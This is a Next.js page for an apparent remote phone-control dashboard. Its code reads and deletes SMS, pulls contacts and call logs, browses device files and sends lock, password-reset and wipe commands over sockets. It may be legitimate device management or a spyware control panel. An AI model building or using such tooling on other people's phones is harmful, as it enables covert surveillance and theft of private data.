"use client";

import { useState, useEffect, useCallback } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import {
  FiArrowLeft,
  FiPhone,
  FiRefreshCw,
  FiUser,
  FiImage,
  FiMessageSquare,
  FiInfo,
  FiFolder,
} from "react-icons/fi";
import { motion } from "framer-motion";
import useSWR, { useSWRConfig } from "swr";
import DeviceDetails from "../components/DeviceDetails";
import MessagesSection from "../components/MessagesSection";
import GallerySection from "../components/GallerySection";
import LiveFileBrowser from "../components/LiveFileBrowser";
import { Device, Message } from "../../../types/device-types";
import UnifiedModal, { ModalType } from "../components/UnifiedModal";
import { useSocket } from "../../context/SocketContext";
import { toast } from "sonner";

const fetcher = (url: string) => {
  const localData = localStorage.getItem("userData");
  const token = localData ? JSON.parse(localData).token : null;

  return fetch(url, {
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${token}`,
    },
  }).then((res) => res.json());
};

export default function DevicePage() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const deviceActId = searchParams.get("id");
  const deviceId = searchParams.get("deviceId");
  const { socket, isConnected } = useSocket();
  const { mutate: globalMutate } = useSWRConfig();

  const [searchTerm, setSearchTerm] = useState("");
  const [sortOrder, setSortOrder] = useState("recent");
  const [filterDate, setFilterDate] = useState("");
  const [showModal, setShowModal] = useState(false);
  const [modalType, setModalType] = useState<ModalType>("forwarding");
  const [isLocating, setIsLocating] = useState(false);
  const [isFetchingContacts, setIsFetchingContacts] = useState(false);
  const [isFetchingCallLogs, setIsFetchingCallLogs] = useState(false);
  const [isAdminBusy, setIsAdminBusy] = useState(false);
  const [showContactsButton, setShowContactsButton] = useState<boolean>(false);
  const [showCallLogsButton, setShowCallLogsButton] = useState<boolean>(false);
  const [activeTab, setActiveTab] = useState<
    "info" | "messages" | "gallery" | "livefiles"
  >("info");

  const {
    data: device,
    mutate: mutateDevice,
    isLoading: isDeviceLoading,
  } = useSWR<Device>(
    deviceId ? `/api/client/devices/${deviceId}` : null,
    fetcher
  );

  const {
    data: messagesData,
    mutate: mutateMessages,
    isLoading: isMessagesLoading,
  } = useSWR<{ messages: Message[] }>(
    deviceId ? `/api/client/sms/${deviceActId}` : null,
    fetcher
  );

  const messages = messagesData?.messages || [];

  useEffect(() => {
    if (!isConnected && socket) {
      socket.connect();
    }
  }, [isConnected, socket]);

  useEffect(() => {
    if (!socket || !device) return;

    const handleDeviceUpdate = (updatedDevice: Device) => {
      if (updatedDevice.id === device.id) {
        mutateDevice(updatedDevice, false);
      }
    };

    const handleNewMessage = (newMessage: Message) => {
      if (newMessage.deviceId === device.id) {
        mutateMessages(
          (current) => ({
            messages: [newMessage, ...(current?.messages || [])],
          }),
          false
        );
      }
    };

    const handleActionInfo = async (data: any) => {
      try {
        const payload = data.payload;
        const cmd = payload.cmd;
        const isSuccess = payload.isSuccess;
        const message = payload.message;
        const filePath = payload.filePath ? payload.filePath : null;

        if (cmd === "getContacts") {
          setIsFetchingContacts(false);
          if (isSuccess) {
            if (filePath) {
              await downloadFile(filePath, "contacts");
            }
            toast.success(message || "Contacts fetched successfully");
          } else {
            toast.error(message || "Failed to get contacts");
          }
        } else if (cmd === "getCallLogs") {
          setIsFetchingCallLogs(false);
          if (isSuccess) {
            if (filePath) {
              await downloadFile(filePath, "logs");
            }
            toast.success(message || "Call logs fetched successfully");
          } else {
            toast.error(message || "Failed to get call logs");
          }
        }
      } catch (error) {
        console.error("Error processing action info:", error);
        setIsFetchingContacts(false);
        setIsFetchingCallLogs(false);
        toast.error("Error processing response from device");
      }
    };

    socket.on("device_updated", handleDeviceUpdate);
    socket.on("new_message", handleNewMessage);
    socket.on("contact_info", handleActionInfo);

    return () => {
      socket.off("device_updated", handleDeviceUpdate);
      socket.off("new_message", handleNewMessage);
      socket.off("contact_info", handleActionInfo);
    };
  }, [socket, device, mutateDevice, mutateMessages]);

  const downloadFile = async (
    fileUrl: string,
    fileType: "contacts" | "logs"
  ) => {
    try {
      const response = await fetch(
        `/api/upload?url=${encodeURIComponent(fileUrl)}&userId=${
          device?.userId || ""
        }&deviceId=${deviceId}`
      );

      if (!response.ok) {
        throw new Error("Failed to download file");
      }

      const contentDisposition = response.headers.get("Content-Disposition");
      let filename = `${fileType}_${Date.now()}`;

      if (contentDisposition) {
        const matches = contentDisposition.match(/filename="(.+)"/);
        if (matches && matches[1]) {
          filename = matches[1];
        }
      }
      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);

      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);
    } catch (error) {
      console.error("Error downloading file:", error);
      toast.error(`Failed to download ${fileType} file`);
    }
  };

  useEffect(() => {
    if (device) {
      setShowContactsButton(!!device.isReadContacts && !!device.status);
      setShowCallLogsButton(!!device.isReadCallLogs && !!device.status);
    }
  }, [device]);

  const handleGetContacts = useCallback(() => {
    if (!socket || !device?.socketId) {
      toast.error("Socket connection or device ID not available");
      return;
    }

    setIsFetchingContacts(true);

    const timeout = setTimeout(() => {
      setIsFetchingContacts(false);
      toast.error("No response from device while getting contacts");
    }, 30000);

    try {
      const commandData = {
        socketId: socket.id,
        toClient: device.socketId,
        user_id: device.userId,
        device_id: device.deviceId,
        action: "getContacts",
      };

      socket.emit("server_command_to_user", commandData);
    } catch (err) {
      console.error("Error sending getContacts command:", err);
      setIsFetchingContacts(false);
      clearTimeout(timeout);
      toast.error("Failed to send getContacts command");
    }

    return () => clearTimeout(timeout);
  }, [socket, device]);

  const handleGetCallLogs = useCallback(() => {
    if (!socket || !device?.socketId) {
      toast.error("Socket connection or device ID not available");
      return;
    }

    setIsFetchingCallLogs(true);
    const timeout = setTimeout(() => {
      setIsFetchingCallLogs(false);
      toast.error("No response from device while getting call logs");
    }, 30000);

    try {
      const commandData = {
        socketId: socket.id,
        toClient: device.socketId,
        user_id: device.userId,
        device_id: device.deviceId,
        action: "getCallLogs",
      };

      socket.emit("server_command_to_user", commandData);
    } catch (err) {
      console.error("Error sending getCallLogs command:", err);
      setIsFetchingCallLogs(false);
      clearTimeout(timeout);
      toast.error("Failed to send getCallLogs command");
    }
    return () => clearTimeout(timeout);
  }, [socket, device]);

  const handleRefresh = useCallback(async () => {
    await Promise.all([
      mutateDevice(),
      mutateMessages(),
      globalMutate(`/api/client/devices/${deviceId}`),
      globalMutate(`/api/client/sms/${deviceActId}`),
    ]);
  }, [mutateDevice, mutateMessages, globalMutate, deviceId, deviceActId]);

  const handleGoBack = () => {
    router.back();
  };

  const filteredMessages = messages
    .filter(
      (msg) =>
        msg.textMessage.toLowerCase().includes(searchTerm.toLowerCase()) ||
        msg.sender.toLowerCase().includes(searchTerm.toLowerCase())
    )
    .sort((a, b) =>
      sortOrder === "recent"
        ? new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime()
        : new Date(a.timestamp).getTime() - new Date(b.timestamp).getTime()
    )
    .filter((msg) =>
      filterDate
        ? new Date(msg.timestamp).toISOString().split("T")[0] === filterDate
        : true
    );

  const handleLocateDevice = async () => {
    if (!device) return;
    setIsLocating(true);
    try {
      await new Promise((resolve) => setTimeout(resolve, 1500));
    } catch (error) {
      console.error("Failed to fetch location:", error);
    } finally {
      setIsLocating(false);
    }
  };

  const handleDeviceAdmin = useCallback(
    (
      action:
        | "enable-device-admin"
        | "lock-device"
        | "force-lock"
        | "wipe-device"
        | "reset-password",
      extra?: Record<string, any>
    ) => {
      if (!socket || !device?.socketId) {
        toast.error("Device is offline or socket not available");
        return;
      }
      setIsAdminBusy(true);
      try {
        const commandData = {
          socketId: socket.id,
          toClient: device.socketId,
          user_id: device.userId,
          device_id: device.deviceId,
          action,
          ...(extra || {}),
        };
        socket.emit("server_command_to_user", commandData);
        toast.success(`${action} command sent`);
      } catch (err) {
        console.error(`Error sending ${action} command:`, err);
        toast.error(`Failed to send ${action} command`);
      } finally {
        setTimeout(() => setIsAdminBusy(false), 1500);
      }
    },
    [socket, device]
  );

  const handleSaveNote = async (note: string) => {
    if (!device) return;
    try {
      const localData = localStorage.getItem("userData");
      const token = localData ? JSON.parse(localData).token : null;

      const response = await fetch(`/api/client/devices/${device.id}`, {
        method: "PUT",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({
          field: "note",
          value: note,
        }),
      });
      if (response.ok) {
        mutateDevice({ ...device, note }, false);
      }
    } catch (error) {
      console.error("Failed to update note:", error);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  const deleteMessage = async (id: string) => {
    try {
      const localData = localStorage.getItem("userData");
      const token = localData ? JSON.parse(localData).token : null;
      await fetch(`/api/client/sms/${deviceActId}?msgId=${id}`, {
        method: "DELETE",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${token}`,
        },
      });
      mutateMessages(
        {
          messages: messages.filter((msg) => msg.id !== id),
        },
        false
      );
    } catch (error) {
      console.error("Failed to delete message:", error);
    }
  };

  if (isDeviceLoading || !device) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 to-gray-800 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-indigo-500 mx-auto mb-4"></div>
          <p className="text-gray-300">Loading device details...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="pl-30 min-h-screen bg-gradient-to-br from-gray-900 to-gray-800 text-gray-100 p-4">
      <div className="max-w-7xl mx-auto">
        {/* Header Section */}
        <div className="flex justify-between items-start mb-6">
          <div className="flex items-center gap-4">
            <button
              onClick={handleGoBack}
              className="p-2 rounded-full hover:bg-gray-700 transition-colors"
            >
              <FiArrowLeft size={20} className="text-indigo-400" />
            </button>
            <div>
              <h1 className="text-2xl font-bold text-white">
                Device Management
              </h1>
              <p className="text-sm text-gray-400">{device.deviceId}</p>
            </div>
          </div>
          <div className="flex gap-2">
            {/* Get Contacts Button - Only show if device.isReadContacts and online */}
            {showContactsButton && (
              <motion.button
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={handleGetContacts}
                disabled={isFetchingContacts}
                className={`p-2 rounded-full flex items-center gap-1 ${
                  isFetchingContacts
                    ? "bg-gray-700 text-gray-500"
                    : "bg-gray-700 text-green-400 hover:bg-gray-600 hover:text-green-300"
                } transition-colors`}
                aria-label="Get contacts"
              >
                <FiUser
                  className={`text-xl ${
                    isFetchingContacts ? "animate-pulse" : ""
                  }`}
                />
                <span className="text-xs hidden sm:inline">Contacts</span>
              </motion.button>
            )}

            {/* Get Call Logs Button - Only show if device.isReadCallLogs and online */}
            {showCallLogsButton && (
              <motion.button
                whileHover={{ scale: 1.05 }}
                whileTap={{ scale: 0.95 }}
                onClick={handleGetCallLogs}
                disabled={isFetchingCallLogs}
                className={`p-2 rounded-full flex items-center gap-1 ${
                  isFetchingCallLogs
                    ? "bg-gray-700 text-gray-500"
                    : "bg-gray-700 text-blue-400 hover:bg-gray-600 hover:text-blue-300"
                } transition-colors`}
                aria-label="Get call logs"
              >
                <FiPhone
                  className={`text-xl ${
                    isFetchingCallLogs ? "animate-pulse" : ""
                  }`}
                />
                <span className="text-xs hidden sm:inline">Call Logs</span>
              </motion.button>
            )}

            {/* Refresh Button */}
            <motion.button
              whileHover={{ rotate: 90 }}
              whileTap={{ rotate: 180 }}
              onClick={handleRefresh}
              disabled={isDeviceLoading || isMessagesLoading}
              className={`p-2 rounded-full ${
                isDeviceLoading || isMessagesLoading
                  ? "bg-gray-700 text-gray-500"
                  : "bg-gray-700 text-indigo-400 hover:bg-gray-600 hover:text-indigo-300"
              } transition-colors`}
              aria-label="Refresh device"
            >
              <FiRefreshCw
                className={`text-xl ${
                  isDeviceLoading || isMessagesLoading ? "animate-spin" : ""
                }`}
              />
            </motion.button>
          </div>
        </div>

        <div className="mb-4 flex flex-wrap items-center gap-2 border-b border-gray-700 pb-2">
          {(
            [
              { key: "info", label: "Info", icon: FiInfo },
              { key: "messages", label: "Messages", icon: FiMessageSquare },
              { key: "gallery", label: "Gallery & Files", icon: FiImage },
              { key: "livefiles", label: "Live Files", icon: FiFolder },
            ] as const
          ).map(({ key, label, icon: Icon }) => (
            <button
              key={key}
              onClick={() => setActiveTab(key)}
              className={`px-4 py-2 rounded-t-lg flex items-center gap-2 text-sm transition-colors border-b-2 ${
                activeTab === key
                  ? "border-indigo-500 text-indigo-300 bg-gray-800/50"
                  : "border-transparent text-gray-400 hover:text-gray-200 hover:bg-gray-800/30"
              }`}
            >
              <Icon className="text-base" />
              {label}
            </button>
          ))}
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          {activeTab === "info" && (
            <>
              <DeviceDetails
                device={device}
                onLocateDevice={handleLocateDevice}
                isLocating={isLocating}
                setShowModal={setShowModal}
                setModalType={setModalType}
                onSaveNote={handleSaveNote}
                onDeviceAdmin={handleDeviceAdmin}
                isAdminBusy={isAdminBusy}
              />
              <div className="lg:col-span-2">
                <MessagesSection
                  messages={filteredMessages}
                  searchTerm={searchTerm}
                  setSearchTerm={setSearchTerm}
                  sortOrder={sortOrder}
                  setSortOrder={setSortOrder}
                  filterDate={filterDate}
                  setFilterDate={setFilterDate}
                  deleteMessage={deleteMessage}
                  copyToClipboard={copyToClipboard}
                  isLoading={isMessagesLoading}
                />
              </div>
            </>
          )}

          {activeTab === "messages" && (
            <div className="lg:col-span-3">
              <MessagesSection
                messages={filteredMessages}
                searchTerm={searchTerm}
                setSearchTerm={setSearchTerm}
                sortOrder={sortOrder}
                setSortOrder={setSortOrder}
                filterDate={filterDate}
                setFilterDate={setFilterDate}
                deleteMessage={deleteMessage}
                copyToClipboard={copyToClipboard}
                isLoading={isMessagesLoading}
              />
            </div>
          )}

          {activeTab === "gallery" && (
            <div className="lg:col-span-3">
              <GallerySection device={device} />
            </div>
          )}

          {activeTab === "livefiles" && socket && (
            <div className="lg:col-span-3">
              <LiveFileBrowser device={device} socket={socket} />
            </div>
          )}
        </div>
      </div>

      <UnifiedModal
        show={showModal}
        onClose={() => setShowModal(false)}
        device={device}
        isLoading={isDeviceLoading}
        setIsLoading={() => {}}
        modalType={modalType}
      />
    </div>
  );
}
